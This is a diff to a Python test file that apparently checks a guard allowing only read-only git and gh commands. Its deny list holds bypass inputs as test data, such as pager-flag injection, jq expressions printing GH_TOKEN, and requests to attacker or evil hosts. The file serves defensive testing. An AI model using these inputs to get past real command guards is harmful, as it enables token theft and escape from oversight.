@@ -19,12 +19,14 @@ ALLOWED = [
     "git --no-pager show HEAD:README.md",
     "git status 2>&1",
     "git branch --show-current",
-    "git branch -a --contains abc123",
+    "git branch -a -vv",
+    "git for-each-ref --contains abc123 refs/heads",
     "git tag --list",
-    "git tag --list 'v*'",
+    "git tag -n",
+    "git cat-file -p HEAD:README.md",
+    "git diff main~1 main -- src",
     "git remote -v",
     "git remote get-url origin",
-    "git remote show origin",
     "git worktree list",
     "git grep -n needle -- src",
     "git grep -n 'a|b;c' -- src",
@@ -51,6 +53,14 @@ ALLOWED = [
     "gh pr view 12 -R o/r",
     "gh pr view 12 --repo=o/r.js",
     "gh repo view o/r",
+    "gh repo view",
+    "gh repo view o/r --json name -q .name",
+    "gh repo view https://github.com/o/r",
+    "gh pr view owner:branch",
+    "gh api -XGET repos/o/r/pulls",
+    "gh search code 'process.env' --repo o/r",
+    "gh pr list --label env",
+    "gh issue list --search 'env var'",
     "gh pr view https://github.com/o/r/pull/1",
     "gh pr view 1 --json title -q '.environment'",
     "gh api -X GET search/issues -f q='repo:o/r is:open'",
@@ -81,12 +91,36 @@ DENIED = [
     ("git --git-dir=x log", "global option"),
     ("git branch new-branch", "listing forms"),
     ("git branch -D old", "listing forms"),
+    ("git branch --edit-description", "listing forms"),
+    ("git branch --unset-upstream", "listing forms"),
     ("git tag v1", "listing forms"),
+    ("git tag --list 'v*'", "listing forms"),
+    # Git hands the next word to a value flag, so `-l` here is a format, not a flag.
+    ("git branch --format -l newbranch", "listing forms"),
+    ("git branch --format --list newbranch", "listing forms"),
+    ("git branch --sort -l a HEAD~1", "listing forms"),
+    ("git tag --format -l newtag", "listing forms"),
+    ("git tag --format -l -v v1", "listing forms"),
+    ("git branch -a --contains abc123", "listing forms"),
+    # The `--` is the pattern of -e, so the options go on after it.
+    ("git grep -e -- '-Oecho ran' -- f", "pager"),
+    ("git grep -e -- --open-files-in-pager=sh -- f", "pager"),
+    # Bash turns ~+ into the working directory before git sees it.
+    ("git -C ~+/evil diff main~1 main", "tilde"),
+    ("git -C ~/evil log", "tilde"),
+    ("git -C ~user/evil log", "tilde"),
+    ("git log --format=~/x", "tilde"),
+    ("git diff a:~/x", "tilde"),
+    ("git log; ~/bin/x", "tilde"),
+    ("git cat-file --filters HEAD:big.bin", "cat-file"),
+    ("git cat-file --textconv HEAD:x", "cat-file"),
+    ("git diff --ext-diff", "--ext-diff"),
+    ("git log HEAD>/dev/null", EXPAND),
     ("git remote add x y", "git remote"),
     ("git remote -v set-url origin y", "git remote"),
-    ("git remote show https://attacker.example/x", "git remote"),
-    ("git remote show ..", "git remote"),
-    ("git remote show evil.git", "git remote"),
+    ("git remote show origin", "git remote"),
+    ("git remote get-url https://attacker.example/x", "git remote"),
+    ("git remote get-url origin extra", "git remote"),
     ("git worktree add ../x", "worktree list"),
     ("git diff --output=/tmp/x", "--output"),
     ("git diff '--output=/tmp/x'", "--output"),
@@ -132,6 +166,8 @@ DENIED = [
     ("gh pr view 1 -w", "--web"),
     ("gh run view 1 -w", "--web"),
     ("gh search repos x --web", "--web"),
+    ("gh pr list --web=true", "--web"),
+    ("gh issue view 1 --web=1", "--web"),
     # gh api: other methods, fields, bundled short flags, other hosts.
     ("gh api", "exactly one endpoint"),
     ("gh api repos/o/r repos/o/s", "exactly one endpoint"),
@@ -149,14 +185,25 @@ DENIED = [
     ("gh api https://attacker.example/c", "not a URL"),
     ("gh api graphql -f query='mutation{x}'", "graphql"),
     ("gh api 'graphql?query=mutation{x}'", "graphql"),
+    ("gh api /graphql", "graphql"),
+    ("gh api GraphQL", "graphql"),
+    ("gh api -XDELETE repos/o/r", "flag '-XDELETE'"),
     ("gh api -H 'X-HTTP-Method-Override: DELETE' repos/o/r", "header"),
     # jq can print the environment, tokens included.
     ("gh api meta --jq 'env.GH_TOKEN'", "environment"),
     ("gh api meta -q '$ENV.GH_TOKEN'", "environment"),
     ("gh api meta --jq=env", "environment"),
     ("gh pr view 1 --json title -q 'env'", "environment"),
+    ("gh pr view 1 --json title -q.env", "environment"),
+    ("gh pr view 1 --json title --jq '\"\\(env)\"'", "environment"),
     # gh sends the request to whatever host is named.
     ("gh repo view example.invalid/o/r", "HOST/OWNER/REPO"),
+    ("gh repo view git@evil.example:o/r", "HOST/OWNER/REPO"),
+    ("gh repo view evil.example:443/o/r", "HOST/OWNER/REPO"),
+    ("gh repo view user@evil.example/o/r", "HOST/OWNER/REPO"),
+    ("gh repo view evil.example:o", "gh repo view takes OWNER/REPO"),
+    ("gh repo view o/r p/q", "one repository"),
+    ("gh repo view o/r --unknown", "gh repo view flag"),
     ("gh pr view 1 -R example.invalid/o/SECRET", "--repo must be"),
     ("gh pr view 1 -Rexample.invalid/o/SECRET", "--repo must be"),
     ("gh pr view 1 --repo=example.invalid/o/SECRET", "--repo must be"),
@@ -228,12 +275,15 @@ class WorkingDirectoryTest(unittest.TestCase):
                 reason = guard.decide(f"git -C {where} diff HEAD~1 HEAD", self.root)
                 self.assertIn("git -C must point inside", reason or "ALLOWED")
 
-    def test_refuses_a_remote_name_that_is_a_folder(self):
-        checkout = os.path.join(self.root, "checkout")
-        self.assertIsNone(guard.decide("git remote show origin", checkout))
-        self.assertIn("git remote", guard.decide("git remote show evil", checkout) or "ALLOWED")
-        self.assertIn("git remote", guard.decide("git -C checkout remote show evil", self.root)
-                      or "ALLOWED")
+    def test_follows_a_symlink_into_a_bare_repository(self):
+        link = os.path.join(self.root, "checkout", "link")
+        os.symlink(os.path.join(self.root, "checkout", "fixtures", "evil.git"), link)
+        reason = guard.decide("git -C checkout/link status", self.root)
+        self.assertIn("git -C must point inside", reason or "ALLOWED")
+
+    def test_refuses_a_file(self):
+        reason = guard.decide("git -C worktree/.git status", self.root)
+        self.assertIn("git -C must point inside", reason or "ALLOWED")
 
     def test_follows_a_chain_of_c_options(self):
         allowed = "git -C checkout -C ../worktree status"
